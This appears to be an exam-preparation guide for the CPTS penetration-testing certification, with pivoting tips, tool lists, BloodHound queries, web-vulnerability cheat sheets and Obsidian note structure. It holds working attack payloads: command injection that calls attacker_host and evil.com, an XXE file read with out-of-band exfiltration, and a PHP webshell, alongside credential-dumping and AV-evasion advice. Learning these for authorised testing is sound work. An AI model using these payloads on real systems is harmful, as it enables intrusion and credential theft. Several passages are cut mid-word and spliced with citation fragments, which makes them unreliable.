One more: SSH port forwards for specific services – e.g., ssh -L 3389:targethost:3389 user@pivot to forward RDP port through pivot for a single host. This way you can RDP using localhost:3389 on your machine to reach the target (useful if you compromised a jump box and want to RDP to an internal server from your host).
SSH Double Pivot Diagram: (Refer to the image above for a visual on multi-hop SOCKS). The concept is: attacker -> jumpbox1 -> jumpbox2 -> final target network【38†L65-L73】【38†L79-L88】. Use local SOCKS at each hop and chain them in proxychains config【38†L95-L103】【38†L107-L111】. It’s complex, but writing down the steps (as in the image) helps ensure you don’t misconfigure. If a double pivot is needed in the exam, don’t shy from spending 30 minutes setting up a stable chain – it pays off by opening the next layer of the network. And document it for the report (clients love to see a diagram of how an attacker tunneled through their network) – it drives home the point about segmentation flaws.
One-Liners and Aliases: Little shortcuts can accumulate big time savings:
Have a bashrc or script with your common aliases: e.g., alias ll='ls -la', alias ports='netstat -tulnp | grep LISTEN' when on Linux hosts, etc. It saves keystrokes.
Use history search (Ctrl+R) frequently to avoid retyping long commands.
In PowerShell, use Invoke-History or up-arrow to reuse commands, and know that | clip pipes output to Windows clipboard (if you have GUI access via RDP, that’s handy to transfer data out via copy-paste).
A quick win on Windows shells: doskey /history shows your current session command history – good for double-checking what you ran if you lose a session unexpectedly.
Create quick and dirty scripts: e.g., a tiny shell script to automatically enumerate interesting things (combine ideas from LinPEAS into a 10-line script focusing on likely exam vulns). Running that after getting a shell can dump a bunch of info while you work on something else.
Network Visualization: If dealing with many subnets, a simple trick: use echo to map them. E.g., maintain a text file of discovered subnets and devices. If you find route from one network to another, note it. In the heat of an exam, it’s easy to forget which IP belongs where. Writing a mini network table saves confusion (like “10.10.10.0/24 – main domain, 10.10.20.0/24 – DMZ servers, 172.16.5.0/24 – secret subnet accessible from host X”). This also translates to a nice diagram later.
Documentation as you go: It’s a time-saving tactic often overlooked: taking a screenshot or note during exploitation means you won’t have to recreate it later. When you get DA, quickly screenshot the proof (whoami on DC, etc.). When you find a critical file, screenshot its content. This way, when writing the report you have all evidence ready and don’t need to re-gather, which can be impossible if the exam lab is taken down. It’s not directly related to hacking, but it will save you time and stress after exploitation is done.
Using these mini tactics, an experienced pentester can shave hours off the total engagement time. CPTS is as much a test of endurance and organization as of pure hacking skill, so every efficiency counts. Adopt these shortcuts in practice so by exam time it’s second nature to, say, spin up an SSH tunnel or launch ffuf with the right options. The more fluid your workflow, the more focus you can devote to analysis and creativity rather than environment wrangling.
By following the guidance above – from leveraging automation and community tools, to mastering manual techniques, to organizing your notes and applying smart shortcuts – you will be well-equipped to excel in the CPTS exam. This comprehensive approach not only helps in capturing all the flags but also in delivering a professional report that highlights the full impact of your findings and provides clear value to the “client” (even if in the exam scenario the client is fictional). Good luck, and remember: methodology and preparedness are your best weapons. With the right preparation (and this vault of tips at your fingertips), you’ll be ready to tackle whatever challenges the CPTS environment throws at you【35†L187-L195】【35†L194-L200】.
CPTS Exam Deep Dive: Optimizing Performance and Reporting
Automated Scripts and Tools for CPTS
In a large Active Directory (AD) environment, leveraging community scripts and tools can save precious time. Below is a curated list of automation aids categorized by phase, with usage tips and caveats:
Reconnaissance & Initial Access: AutoRecon​
GITHUB.COM
 – a multi-threaded recon wrapper that automates Nmap scans and service enumeration (useful for broad port sweeps and quick service detection). It launches targeted scanners (e.g. feroxbuster for HTTP) based on open ports, accelerating discovery​
GITHUB.COM
. ffuf and wfuzz – fast fuzzers for discovering files, directories, and parameters. For example, use ffuf to brute-force web paths: ffuf -u http://site/FUZZ -w wordlist.txt -fc 404 (exclude 404 codes). Caveat: Automated recon tools can produce noise; on exam networks (especially external-facing web apps), ensure you stay in scope and avoid heavy exploits by default (AutoRecon’s default config avoids auto-exploitation)​
GITHUB.COM
. Always supplement with manual probing if something looks odd (no tool finds everything​
GITHUB.COM
).
Web Exploitation: Burp Suite – indispensable for intercepting requests, fuzzing parameters, and manipulating attacks. Community extensions (e.g. Autorize for auth bypass, SQLMap plugin) can speed up testing. SQLMap – automates SQL injection exploitation (time-saving when manual injection yields many results). Commix – automates command injection on web forms. OPSEC: Use these after initial manual testing to confirm findings; blind reliance can waste time (SQLMap might chase false positives). Instead, craft a small set of test payloads for common bugs and automate their trial (e.g. use Burp Intruder to inject '; WAITFOR DELAY '0:0:5'-- for SQLi or & ping -n 1 attacker_host & for OS command injection). Watch out for WAFs—if payloads get blocked, try encoding or alternate syntax (e.g. use %25 encoding for special chars). Example: For a suspected Local File Inclusion, fuzz with encoded traversal sequences: ../../etc/passwd, ..%2f..%2fetc/passwd, etc., and look for telltale strings like “root:x:” in responses. This approach quickly confirms an LFI and bypasses basic filters.
Windows & AD Enumeration: SharpHound/BloodHound – SharpHound collects AD data which you analyze in BloodHound to map attack paths​
BRUNOROCHAMOURA.COM
. This is essential in CPTS for visualizing relations: e.g. shortest paths to Domain Admin, users with SPN (Kerberoast)​
REDFOXSEC.COM
, etc. When to use: after getting an initial foothold with domain user creds or shell, run SharpHound (PowerShell or executable) to enumerate AD. OPSEC: SharpHound can trigger AV; use the stealth collection (-c All --Stealth) if needed, or run from a safe host. A safer alternative is LDAP queries/PowerView – PowerView PowerShell functions can enumerate users, groups, ACLs without binary execution​
BRUNOROCHAMOURA.COM
 (e.g. Get-DomainUser for all users, Find-InterestingDomainAcl for ACL abuse). Keep in mind many PowerView scripts are flagged by Defender. If PowerView is blocked or crashes mid-run, fall back to built-in commands: nltest /dclist:DOMAIN (list domain controllers), net group "Domain Admins" /domain (members of Domain Admins), or use Impacket tools over Python from your Kali. Impacket’s suite (e.g. GetUserSPNs.py, ldapsearch.py, secretsdump.py) is highly valuable​
MOTASEMHAMDAN.MEDIUM.COM
 – for example, use GetUserSPNs.py to find Kerberoastable accounts by querying servicePrincipalNames. Caveat: On very large domains, Impacket’s GetUserSPNs.py may timeout or dump huge data; consider narrowing scope (filter by OU or use -target-domain). A known issue is GetUserSPNs.py hanging on slow networks – if it fails, you can achieve the same via PowerShell: Get-ADUser -Filter 'ServicePrincipalName -like "*/*"' -Properties ServicePrincipalName.
Credential Hunting & Post-Exploitation: Mimikatz – the go-to for harvesting Windows credentials from memory (LSASS). Use it after gaining admin on a box to dump plaintext creds, Kerberos tickets, or perform DC sync. OPSEC: Mimikatz is highly flagged; to evade, run it in-memory (e.g. via Invoke-Mimikatz in PowerShell) or use a safer dumper like rundll32 with a DLL. If Mimikatz is blocked or crashes (common on modern systems with Credential Guard), use alternatives: rubeus (C# tool for Kerberos operations like ticket harvesting, curb roasting)​
BRUNOROCHAMOURA.COM
 or dumpert/nanodump to dump LSASS and then analyze offline with Mimikatz on Kali. LaZagne – post-exploitation tool to search for saved passwords on the target (browsers, Wi-Fi creds, etc.). Run it on compromised endpoints to scrape plaintext creds that users saved. Also consider Seatbelt​
MEDIUM.COM
​
MEDIUM.COM
 – a C# “living off the land” enumerator that finds interesting user data (browser history, Cloud credentials, putty sessions, etc.) with less AV detection. Caveat: Always verify any found credentials by attempting logins – outdated or incorrect creds can mislead your attack path.
Privilege Escalation (Local): WinPEAS & LinPEAS – privilege escalation auditing scripts for Windows and Linux, respectively. These enumerate system configs, vulnerable software, SUID files, misconfigured privileges, etc., in one go​
MEDIUM.COM
​
MEDIUM.COM
. When to use: once you have a low-priv shell on a box and manual checks haven’t immediately revealed an easy win, run PEAS scripts to ensure nothing is missed. OPSEC: They can be noisy (touch many files/processes). On Windows, WinPEAS may trigger Defender; a workaround is using the PowerUp script (a PowerShell priv-escalation tool)​
MEDIUM.COM
 or running WinPEAS’s smaller modules. On Linux, LinPEAS is usually safe to run; still, double-check any exploit suggestion it prints. Windows Exploit Suggester (WES-NG) – feed it the output of systeminfo to get a list of potential Windows kernel or local exploits (e.g. missing patches like Hot Potato, etc.). Linux exploit suggester – similar idea; after uname -a and OS release info, it suggests known kernel CVEs. Caveat: Always confirm kernel versions and exploit compatibility. Relying blindly on automated suggester output can be dangerous – e.g., running the wrong kernel exploit can crash a system (fail open). If an exploit is recommended (say, DirtyPipe for a Linux kernel), read its documentation and ensure kernel build matches before executing.
Active Directory Attacks & Automation: Tools like BloodHound not only enumerate but can automate attack path exploitation. ACLPwn​
GITHUB.COM
, for instance, connects to BloodHound’s Neo4j database and attempts to auto-exploit ACL-based paths to escalate privileges. It can take a BloodHound-identified path (like user has GenericAll on an OU) and perform the steps to grant you higher rights​
GITHUB.COM
. Use with caution: in an exam, automated exploitation might be considered too risky or out-of-scope; use such tools more for verification than initial action. CrackMapExec (CME) – now rebranded as NetExec on HTB​
BRUNOROCHAMOURA.COM
, it’s a Swiss-army knife for Windows network enumeration and exploitation. With one liner you can test credentials across hosts, execute commands on multiple machines, and enumerate shares or user sessions. **Ide​
BRUNOROCHAMOURA.COM
​
BRUNOROCHAMOURA.COM
some credentials – use CME/NetExec to spray them across the network (e.g. netexec -u user -p 'Password123' --local-auth 10.10.10.0/24 to find where they work) and run a command (like dumping SAM). OPSEC: CME’s power can also lock accounts if used for password spraying without care; use --no-bruteforce and respect lockout policies (consult BloodHound for LockoutThreshold). If NetExec/CME fails or crashes (for example, older CME versions had issues with WinRM threads), you can achieve similar results with individual Impacket tools (wmiexec, smbexec, etc.) or PowerShell remoting.
Pivoting & Tunneling: As CPTS often involves pivoting through multiple network segments, tools to create SOCKS proxies and port forwards are vital. Chisel – a fast TCP tunneling tool (client-server) to forward or reverse-forward ports through a compromised host. Ligolo-ng – a newer favorite that provides a stable, encrypted SOCKS5 tunnel​
MEDIUM.COM
. Recommendation: “Use Ligolo-ng from the start”​
MEDIUM.COM
 – it’s more resilient than Chisel (survives pivot host reboots, easier to set up mutual TLS). If Chisel tends to die or requires re-running, switch to Ligolo-ng. Both eliminate the need for clunky proxychains in many cases. When pivoting on Windows, consider Proxifier (GUI tool to route traffic through a proxy) if you need to force a GUI app (like a browser or RDP client) through your tunnel. Also keep handy SSH for classic port forwarding (local and remote) and sshuttle for quick VPN-like routing. Caveat: Not all tools obey proxy settings – e.g., netstat or built-in nslookup on a remote host won’t route through your SOCKS. Test critical tools with your pivot (the proxychains ≠ magic principle​
MEDIUM.COM
). If something ignores your SOCKS proxy, you may need an alternate method (e.g. an actual ssh -L port forward or use Meterpreter portfwd for that specific port).
In summary, automate what is tedious or time-consuming, but remain ready to manual fallback. Each of the above tools can fail under pressure – having multiple options (one script, one manual method) for each task ensures you’r​
GITHUB.COM
ed. Equally important: practice using these tools ahead of time so you’re fluent during the exam. As one CPTS veteran notes, he kept a “mistake log” in his notes to recall what went wrong with tools in the past and why​
MEDIUM.COM
 – this helped avoid repeating those errors under exam conditions.
BloodHound Queries and Efficiency Boosters
BloodHound is invaluable for mapping AD attack paths, but knowing specific queries can speed up your path to Domain Admin (DA). Instead of blindly clicking around the GUI, use targeted Cypher queries or built-in Analysis queries. Key BloodHound queries to streamline CPTS-style AD exploitation include: 

BloodHound graph showing multiple Kerberoastable user paths to Domain Admin (each green n​
BRUNOROCHAMOURA.COM
 a user with an SPN, and edges trace potential privilege escalation routes to the Domain Admins group on the right). Understanding these relationships helps prioritize attacks​
REDFOXSEC.COM
​
REDFOXSEC.COM
.
Find Kerberoastable Users: This reveals service accounts with Service Principal Names (SPNs) – prime targets for offline cracking. Use Cypher: MATCH (u:User) WHERE u.hasspn=true RETURN u.name​
REDFOXSEC.COM
. Run this early, once you have any domain user access, to list accounts for Kerberos roasting. In BloodHound’s GUI, the built-in query “List all kerberoastable users” accomplishes the same. Usage: After dumping SPNs (via GetUserSPNs.py or SharpHound data), prioritize cracking those accounts’ hashes, as they often lead to lateral movement or privilege escalation.
Find AS-REP Roastable Users: Some user accounts have “Do not require Kerberos preauthentication” set, meaning you can request encrypted A​
MEDIUM.COM
s without any credentials. Query: MATCH (u:User {dontreqpreauth: true}) RETURN u.name​
REDFOXSEC.COM
. These accounts (if any) can be attacked with AS-REP roasting (e.g. using Impacket’s GetNPUsers.py). Context: Even a locked-out or disabled user can be AS-REP roasted if this flag is on, so this query might reveal a hidden opportunity for an offline crack.
Admins Currently Logged On (Session Hunting): It’s often fruitful to target machines where high-privilege users are active. BloodHound can show you where Domain Admins have sessions. Query: MATCH (u:User)-[:MemberOf*1..]->(g:Group) WHERE g.objectid ENDS WITH '-512' MATCH p=(c:Computer)-[:HasSession]->(u) RETURN c.name, u.name​
REDFOXSEC.COM
. This finds any computer where a Domain Admin account has a session. If you compromise that computer (even with a normal user), you might extract the DA’s token or credentials from memory. When to use: After an initial foothold, run this to decide which machine to target next for lateral movement (i.e. pivot to a box where an admin is logged in). It’s essentially an attacker’s “VIP list” of hosts.
Local Admin Mapping: Identify which users are local admins on which machines. Query: MATCH (u:User)-[r:AdminTo]->(c:Computer) RETURN u.name, c.name ORDER BY u.name​
REDFOXSEC.COM
. BloodHound’s “Map local admin rights” does this too. Usage: Suppose you compromised User X; this query shows if User X is admin on certain hosts. Those hosts become your next targets (because you can leverage X’s admin rights to fully compromise them). It’s also useful post-DA to see the extent of admin sprawl (which accounts are overly powerful on many systems).
RDP Access Rights: Sometimes any domain user can RDP into certain servers (a misconfiguration). Query: MATCH p=(g:Group)-[:CanRDP]->(c:Computer) WHERE g.objectid ENDS WITH '-513' RETURN p​
REDFOXSEC.COM
. This checks if the Domain Users group (RID 513) has RDP access to computers. If yes, any user (once you have their creds or a shell) could log on interactively to those systems. Usage: If you find such a system, it’s a great pivot – you might not even need to exploit a vulnerability, just use valid creds to RDP in and escalate from there.
Shortest Paths to Domain Admin: BloodHound’s killer feature is finding attack paths. The GUI’s “Shortest Path to Domain Admins” query will highlight the minimal steps from any owned principal to a DA​
SANS.ORG
. For more precision, you can target, say, “Shortest paths from Kerberoastable users to DA”. In the UI, this is a pre-built query: it shows if cracking any SPN account password could immediately grant DA rights (e.g. the SPN user is a direct Domain Admin or has privileges to one)​
SANS.ORG
. Usage: After collecting BloodHound data, run these path queries before spending time on low-impact targets. It helps triage: you might discover that one particular user (with an SPN​
GITHUB.COM
via “AddKeyCredentialLink” or some ACL to Domain Admin – making them your golden goose to crack. Always validate each step of the path in practice (BloodHound assumes default conditions; e.g., HasSession means you still need to dump creds from that session which might require local admin).
Sensitive Accounts and Trusts: Additional handy queries: Find users with PASSWD_NOTREQD (Password not required – sign of potential weak accounts) and Find all Unconstrained Delegation machines (these systems can be used to capture DA tickets if a DA logs into them). While not built-in, you can craft: MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name for the latter. These are more situational but can reveal “low-hanging fruit” config flaws that lead to privilege escalation without exploits.
Before vs. After DA: Prioritize queries that reveal escalation paths before you have DA (the ones above). Once you become Domain Admin, pivot your BloodHound usage to post-DA tasks: identify Tier 0 assets and any trusts. For example, run “Find another domain trusts” if multiple domains exist, or “Shortest path to High Value targets” (where “High Value” might be a custom tag for critical servers like Exchange or SQL). This ensures you fully compromise the environment as required by the exam objectives. Finally, don’t forget the performance aspect: BloodHound can ingest huge AD datasets. Use filters to speed up queries (e.g., target specific OU or omit disabled accounts). And if the GUI is slow, you can query the Neo4j database directly with Cypher (the CompassSecurity repo of custom queries​
GITHUB.COM
 is a great resource). Efficient BloodHound use – running the right queries at the right time – can turn hours​
MEDIUM.COM
 enumeration into minutes of visual insight, letting you focus on execution.
Initial Access Optimization (Web & Network)
The CPTS exam features complex web apps and external network entr​
MEDIUM.COM
ognizing vulnerabilities quickly is crucial. Below is a quick-reference cheat sheet for fuzzing and common exploits (LFI, RCE, XXE, SQLi, command injection), including detection patterns and bypass tricks:
Fuzz Smartly: Use targeted fuzzing to reveal hidden functionality. For files and directories, start with wordlists (like SecLists) in tools like ffuf or dirsearch. Tip: Include extensions in your fuzz (e.g. -e .php,.asp,.txt in ffuf) to catch backup files. Monitor response codes and sizes – not just 200 OK. A 302 redirect or a 500 error can signal a hit (e.g., LFI might throw a 500 when a file include fails). Also fuzz HTTP parameters for content discovery: a tool like ffuf can fuzz parameter names and values (ffuf -u http://site/page.php?FUZZ=test -w params.txt -fw 0 to find usable parameters by looking for responses differing from baseline). Bypass trick: If a filter blocks your fuzz (e.g., WAF), try manipulating case or using an alternate Host header (some web apps respond differently to Host: localhost).
LFI (Local File Inclusion):
LFI (Local File Inclusion): Look for parameters like file=, path=, page= – these often indicate inclusion. A quick test is to input ../../../../etc/passwd (for *nix) or ..\..\boot.ini (Windows). Detection pattern: if the response contains fragments like root:x: or [boot loader], you have an LFI. Even an error message like “failed to open stream” with a file path is a clue. Bypass tricks: If ../ sequences are blocked, double URL-encode them (%252e%252e%252f = ../). Append a null byte (%00) to bypass extensions in very old PHP apps (e.g., file=../../shell.php%00.jpg). Utilize PHP wrappers for edge cases (e.g., php://filter/convert.base64-encode/resource=... to read source code). Fast wins: Try common files (/etc/passwd, /windows/win.ini) and the app’s config file (often /var/www/html/config.php). If you get an LFI, consider LFI to RCE via log poisoning: for instance, if you can inject PHP code into an access log (by making a user-agent <?php system($_GET['c']);?>) and then include the log file, you gain RCE. This multi-step attack is time-consuming though – pursue it only if needed for a foothold.
RCE & Command Injection: These occur when user input is executed as system commands. Common spots: form fields that might call shell scripts (ping, traceroute, file upload processing). Detect quickly: Insert a command separator like ; or && in a parameter. Example: if a page has a host lookup form, try google.com; whoami. If output is reflected (e.g., “root” in response), you have RCE. Many times output won’t be shown; use a timing side-channel – e.g. append ; ping -c 3 127.0.0.1 (observe delay) or for Windows & timeout /T 5. The delay confirms code execution even without output. Another trick: trigger DNS queries to yourself (nslookup yourdns.evil.com) and watch your DNS server logs. Bypasses: 
BRUNOROCHAMOURA.COM
filtered, use ${IFS} (internal field separator) in Linux or concatenate commands (ping$IFS-c$IFS1). If certain chars are blocked, try others (| or %0a newline instead of ;). Sometimes parameters are wrapped in quotes server-side, so injecting ";whoami;" can break out. Time-saver: Maintain a shortlist of payloads for different OS – e.g., ;whoami, &whoami (Linux/Windows) and | id for good measure – and test them in one go via a Burp Intruder cluster bomb. Also remember web RCE can come from file uploads (uploading a web shell .asp,.php etc.). If you find an upload function, attempt to upload a simple webshell (like PHP <?php system($_GET['c']); ?>). If the file type is restricted, try double extensions (shell.php.jpg) or MIME type tricks. Quickly locating an upload and getting a shell is often the fastest path to initial access in web apps.
XXE (XML External Entity injection): If you encounter an XML input (e.g., file upload using XML, SAML authentication, SOAP API), suspect XXE. To test safely, send a minimal malicious XML payload. For example:
xml
Copy
Edit
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
If the response includes “root:x:” (for /etc/passwd), you’ve succeeded. If not, look for error messages about entities. Blind XXE detection: Use an external request. Define <!ENTITY xxe SYSTEM "http://<YOUR-SERVER>/abc"> and in the XML use &xxe;. If your server logs an incoming request to /abc, the XXE worked (even if you can’t read files directly, this confirms vulnerability). Bypass: Some parsers disallow the older SYSTEM entity but allow newer techniques (like using <image> tags in SVG files or forcing error messages via <!ENTITY % ext SYSTEM "file://...">). If direct file retrieval is blocked, consider out-of-band exfiltration: e.g., SYSTEM "http://yourserver.com/?q=%25{FILE_CONTENT}%25". Quick recognition: Many XXE payloads require trial and error, so note app behavior – if providing a normal XML yields one result but adding a doctype yields a different error or delay, you might be on track. Also inspect any XML-based functionality (like exporting data) for odd output that could be file contents. Given the time, leverage ready-made XXE payload cheat sheets (like the one from OWASP) – copy a small payload and observe; it’s faster than crafting from scratch.
SQL Injection: The classic SQLi can be a quick win for dumping creds or getting RCE via database features. Fast detection: Try a simple ' (single quote) in text inputs – a SQL error like “syntax error” or “unclosed quote” confirms a vulnerability. In a login form, use ' OR '1'='1 in the username or password – if you get logged in as an admin, it was wide open. For blind SQLi (no visible errors), use boolean tests: e.g., add OR 1=1-- versus OR 1=2-- to see if page content changes. Timing attacks are another fallback: '; SELECT pg_sleep(5)-- for PostgreSQL or '; WAITFOR DELAY '0:0:5'-- for MSSQL – the page hanging for 5 seconds is a positive sign. Extraction tips: Once confirmed, find the number of columns with ORDER BY or UNION SELECT NULL,.... Then use UNION SELECT to dump data like usernames and password hashes (often from users table). Focus on tables relevant to auth or any credentials. Bypass techniques: If quotes are filtered, use CHAR codes (e.g., CHAR(97) for 'a') or concatenate with + for MS SQL. If a WAF blocks common terms, use case variation or comments: UNunionION SELselectECT. Leveraging SQLMap can save time if the injection is complex – it will automate data extraction, but be m​
BRUNOROCHAMOURA.COM
 time (SQLMap can be slow on blind injections; use its --tamper scripts if facing a WAF). Pro tip: Many web apps have SQLi only in certain parameters – fuzz all GET and POST params with a single quote using Burp Intruder and look for differences. Often, one parameter out of many might throw a SQL error. Catch it, exploit it, and move on quickly.
Command Injection vs. SQLi vs. LFI – recognizing the vulnerability: Sometimes an app might show ambiguous errors. A tip for quickly distinguishing: SQLi errors often mention SQL syntax or database driver names (e.g. “ODBC” or “SQLite” or line numbers in a SQL query). LFI issues might show file paths or PHP include errors. Command injection often has no error at all – so if input causes a freeze or significantly slower response, lean towards injection and test with a harmless command like && echo SUCCESS. The ability to tell these apart from their symptoms will save time – you won’t chase a false lead (e.g., mistaking an LFI for a crash). When in doubt, go through a checklist: add a ' – any SQL error? If not, add ;echo TEST – does “TEST” appear? If not, try an LFI payload – any file content? This methodical approach can identify the vuln type within a minute.
Time-saving heuristics for vulnerable apps: Leverage what you know about the tech stack. If phpinfo() output or an error reveals the se​
BRUNOROCHAMOURA.COM
ocus on LFI, file upload, or deserialization bugs. If it’s .NET/IIS, test for verbose SQL errors or authentication bypasses. Use tools like WhatWeb/Wappalyzer early to fingerprint frameworks (e.g., an “X-Powered-By: Express” header hints at Node.js – maybe NoSQL injection or prototype pollution). During enumeration, note any default credentials possibilities (e.g., Tomcat manager, Jenkins, etc. from the Bruno’s CPTS prep list【10†L151-L160】【10†L163-L172】). Sometimes the fastest “exploit” is just admin:admin on an old web interface. In practice, CPTS exam targets often mix web vulns and misconfigurations, so apply this cheat 
BRUNOROCHAMOURA.COM
ally: for each web app, perform a quick sweep with these tricks. A few minutes of smart fuzzing and test payloads can reveal a critical weakness that gets you initial foothold.
Efficient Obsidian Usage and Structure
Proper note-taking can make or break your exam performance. Obsidian, a markdown-based note app, is ideal for organizing CPTS prep materials and live exam notes. Here’s how to structure your vault for maximum efficiency, along with templates and tips to speed up usage during the exam:
Vault Organization: Create a vault structure that separates reference materials from engagement-specific notes. For example:
bash
Copy
Edit
CPTS-Vault/
├── 00_Reference_Cheatsheets/
│   ├── WebExploitation.md
│   ├── AD_Attacks.md
│   ├── PrivEsc_Windows.md
│   ├── PrivE&#8203;:contentReference[oaicite:44]{index=44}│   └── ... (more topic-wise cheatsheets)
├── 01_Templates/
│   ├── Host_Enum_Template.md
│   ├── Exploit_Writeup_Template.md
│   ├── Report_Finding_Template.md
│   └── GotThis_DoThat.md
├── 02_Practice_Labs/
│   ├── AEN_Lab_Notes.md
│   └── [Other lab or HTB box notes].md
└── 03_Exam_Engagement/
    ├── Host1_Foothold.md
    ├── Host1_PrivEsc.md
    ├── Host2_Pivot.md
    ├── ... etc ...
    └── Final_Report_Draft.md
Explanation: The Reference_Cheatsheets holds your pre-built knowledge (commands, techn​
MEDIUM.COM
emplatesfolder contains note templates for quickly jotting down common structures.Practice_Labscan hold notes from your prep work (like the Attacking Enterprise Networks lab, ProLabs, etc., treated as mini engagements).Exam_Engagement` is where you’ll create notes during the actual CPTS exam – one note per host or per major phase. By separating these, you ensure that during the exam you’re not wading through unrelated info; you have your clean workspace plus the reference section readily available.
Templates for Speed: Setting up Obsidian templates (with the Templater plugin【5†L221-L229】) will let you insert pre-formatted content with a hotkey. Key templates to prepare:
Exploit Writeup Template: A note blueprint for documenting a found vulnerability. Include headings like Description, Affected Host/Service, Steps to Reproduce, Exploit Code/Payload, Outcome (Flag or Shell), Mitigation. Having this ready means the moment you discover a vuln (say SQLi), you hit your template hotkey and fill in the details. This ensures your notes capture everything needed for the report later.
“Got This? Do That!” (If-Then) Workflow: This is essentially a decision-tree in text form – a quick lookup guide for next steps. Format it as a table or bullet list, e.g.: “Got credentials 
BRUNOROCHAMOURA.COM
rack with John/Hashcat【49†L234-L243】. Got low-priv shell on Windows? Do WinPEAS & whoami /priv. Got SeImpersonatePrivilege? Do JuicyPotato or PrintSpoofer.” Cover common scenarios. During the exam, when you encounter something (like discovering a user is in DnsAdmins group), refer to this note: it should remind you “DnsAdmins → can install DLL as system (DNSAdmin exploit)”. This reduces analysis paralysis and saves mental energy.
Cheatsheets: Break these down by topic and service. For instance, have a ready list of pspy usage for cron jobs, common misconfig commands (Windows registry autoruns, Linux sudoers quirks), etc. You might already have these from your prep; Obsidian just makes them easily searchable. Use clear headings in each cheatsheet so you can Ctrl+O (Quick Switcher) and type “MySQL injection” or “Linux SUID” to jump right there. One effective approach is what one CPTS taker did: 100+ notes organized by phase【35†L180-L189】 (Recon, Exploitation, Post-Exploitation, Pivoting, Reporting), each containing use cases, syntax, command variations, and even past mistake logs. That way, whatever phase you’re in, you open that note and have a checklist at hand.
Reporting Components: It helps to have a template for the final report or at least the key sections. For example, a Flags Captured template – a table listing each target, flags or proof files found, and brief description (so you don’t forget any objectives). Also a Privilege Escalation Paths template – where you note each pivot (user X → admin on Host Y → dumps cred of User Z → etc.). This will greatly help when writing the narrative of the report. Additionally, have a Mitigations snippets list (common fixes for vulns) so you can quickly add those to report findings. The idea is to minimize writing from scratch under time pressure.
Folder Layout for 
MEDIUM.COM
ts: During an actual pentest (or the exam, which is an extended assessment), mirror your methodology. For instance, inside Exam_Engagement/Host1_Foothold.md, you might have sections: Recon, Exploitation, Post-Exploitation for that host. In Host2_Pivot.md, note how you got there (credentials used or exploit), and so on. Maintaining separate notes per host helps when you need to recall “how did I get access to this machine?” – you’ll have it n​
BRUNOROCHAMOURA.COM
ed. Also consider a top-level Engagement Journal.md where you log a timeline of actions (timestamped entries of what you attempted when). This can be as simple as bullet points with times. It serves two purposes: keeping you on track and providing a sanity-check log if you need to retrace steps.
Speed Tips for Obsidian during Exam: Familiarize yourself with Obsidian’s core features:
Quick Switcher: By pressing Ctrl+O (or your custom key), you can fuzzy-search any note title. This is incredibly fast for pulling up cheatsheets. For example, typing “priv esc win” could immediately bring up your Windows PrivEsc note.
Backlinks and Index: Maintain an index note (could be your vault homepage) with links to all major references. Or use a pinned note that serves as your personal index (“Start Here”). For instance, your index note might list: Web Exploitation (link), Network Enum (link), BloodHound Queries (link), etc., acting as a visual menu. Having this open in one pane while you work in another can save search time.
Pinning & Splitting: Pin important notes (right-click the tab -> Pin). E.g., pin your GotThis_DoThat.md and maybe your Flags note. This way you won’t accidentally close them. Use split view to see two notes side by side (Obsidian allows multip​
BRUNOROCHAMOURA.COM
great combo is reference on one side, current attack notes on the other.
Templater Hotkeys: As mentioned, set hotkeys for inserting templates (Obsidian supports Alt+E for template selection with the plugin【5†L225-L228】). Practice this: e.g., when you land a shell, immediately use your “Host_Enum_Template” to jot down kernel version, whoami, ipconfig, etc., so you systematically capture key info for each host. This reduces the chance of missing something like forgetting to note the IP or OS version which you’ll need later.
Daily Notes or Scratchpad: Consider enabling a daily note feature – each day of the exam you get a note (e.g., “Day3.md”) where you can do quick scribbles, brain dumps, or task lists. This can serve as a mini-agenda: e.g. “To-do: exploit SQLi on app1, crack AS-REP hash, run BloodHound on DC02”. Checking them off feels good and keeps you organized over the exam’s multiple days.
Search within notes: Use Ctrl+F in Obsidian to search the current note, and the global search for vault-wide grep. For example, if you recall writing down an exploit but can’t find it, global search a keyword. The speed of text search in Obsidian is great 
BRUNOROCHAMOURA.COM
cating that one command you used in practice but forgot.
Improving quick reference: Utilize wiki links in Obsidian. Link related no​
BRUNOROCHAMOURA.COM
te Name]]`. For example, in your AD cheatsheet, if you mention Kerberoasting, link it to a detailed Kerberoast step-by-step note. During the exam, this creates a web of knowledge you can traverse with clicks rather than hunting manually. Some users create a “graph of concepts” so they visualize connections – while the graph view is cool, in an exam you’ll likely stick to the search and links. Still, it’s there if you need to see, for instance, all notes connected to “Active Directory”.
Lastly, practice your note-taking workflow. During CPTS preparation labs, simulate exam conditions and use Obsidian exclusively for notes【35†L223-L232】. By exam day, it should feel second nature. One CPTS graduate mentioned that during the exam his Obsidian “field manual” was his only reference – no searching the web, just him and his notes【35†L194-L200】. That’s the confidence you want: trust your Obsidian vault as your external brain. This not only improves speed but also reduces stress, since you know exactly where to find that crucial command or syntax when you need it.
Manual vs. Automated Windows Enumeration
When inside a Windows domain environment, you’ll gather information either manually (built-in commands, custom scripts) or via automated tools (PowerView, SharpHound, etc.). Both approaches have merits. The key is to use each method’s strength under exam time constraints:
PowerView (Manual-ish via PowerShell): PowerView (part of PowerSploit) is a collection of PowerShell functions for AD enumeration – e.g. Get-NetUsers, Get-NetGroup -AdminCount 1 (find privileged users), Find-LocalAdminAccess (where current user is local admin). Using PowerView is almost manual because you choose exactly which queries to run. Pros: Granular control; you can query specific info stealthily (useful if the environment has detection – though in an exam, “stealth” is less concern, but reliability is). If you suspect a particular misconfiguration, a targeted PowerView query might surface it faster than sifting through BloodHound graphs. Cons: It’s slower to cover everything – you might miss an attack path if you don’t run the right function. Also, modern defenses often flag PowerView usage (its signatures are well-known). If PowerView is causing script block logs or outright being deleted by Defender, you may need to encode it or switch to an alternative like SharpView (a C# port of PowerView that can sometimes slip past AV). In the exam, running PowerView is fine if you’ve got an execution method (like PowerShell session), but be prepared for it to possibly error out on very large domains (e.g., Get-NetComputer listing thousands of machines may be slow).
